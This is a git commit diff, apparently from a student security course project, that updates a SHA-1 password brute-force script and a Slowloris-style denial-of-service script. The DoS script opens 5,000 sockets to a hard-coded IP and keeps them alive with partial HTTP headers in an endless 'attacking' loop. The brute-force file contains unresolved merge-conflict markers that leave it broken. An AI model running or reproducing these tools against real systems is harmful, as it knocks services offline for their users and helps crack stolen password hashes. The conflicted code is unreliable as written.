88ac7b8fb2cfd5b00452b56e528b64cd18750b9a
teiwiet <omegalmao1.3@gmail.com>
2023-10-25 11:20:34 +0700

    update

--- function/brute-force/brute_force_sha1.py
+++ function/brute-force/brute_force_sha1.py
@@ -1,5 +1,9 @@
 import hashlib
-with open(r"D:\edoc\project\BTL-ATTT\10-million-password-list-top-1000000.txt","r") as file:
+<<<<<<< HEAD
+with open(r"D:\edoc\project\BTL-ATTT\function\brute-force\password_list.txt","r") as file:
+=======
+with open(r"/home/nukedukk/Main/edoc/project/BTL-ATTT/function/brute-force/password_list.txt","r") as file:
+>>>>>>> 1c0c5e8040e78b2ecd3fcc65c67f1d7ac264ce92
     lines = file.read().splitlines()
 def cal_hash(string):
     hash = hashlib.sha1(string=string.encode())
--- function/dos/dos.py
+++ function/dos/dos.py
@@ -6,6 +6,7 @@ def send_line(self, line):
 def send_header(self, name, value):
     self.send_line(f"{name}: {value}")
 list_of_sockets = []
+
 setattr(socket.socket, "send_line", send_line)
 setattr(socket.socket, "send_header", send_header)
 
@@ -14,31 +15,41 @@ def init_socket(ip: str):
     s.settimeout(4)
     s.connect((ip, 80))
     s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
-    ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    ua ="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
     s.send_header("User-Agent", ua)
     s.send_header("Accept-language", "en-US,en,q=0.5")
-    return s
-
-def process():
+def process(ip:str):
     for s in list(list_of_sockets):
         try:
             s.send_header("X-a", random.randint(1, 5000))
         except socket.error:
             list_of_sockets.remove(s)
-
-def main():
-    for _ in range(5000):
+    diff = 5000 - len(list_of_sockets)
+    for _ in range(diff):
         try:
-            s = init_socket("192.168.1.237")
+            s = init_socket(ip)
+            if not s:
+                continue
+            list_of_sockets.append(s)
+        except socket.error as e:
+            break
+def main():
+    # ip = input("Target IP: ")
+    ip = "192.168.1.237"
+    socket_count = 5000
+    print("Creating Socket...")
+    for _ in range(socket_count):
+        try:
+            s = init_socket(ip)
         except socket.error as e:
             break
         list_of_sockets.append(s)
-
+    print("Start attacking")
     while True:
         try:
-            process()
+            process(ip)
         except (KeyboardInterrupt, SystemExit):
-            print("Stop...")
-            pass
+            print("\nCtrl-C : KeyboardInterrupt")
+            break
 if __name__ == "__main__":
     main()
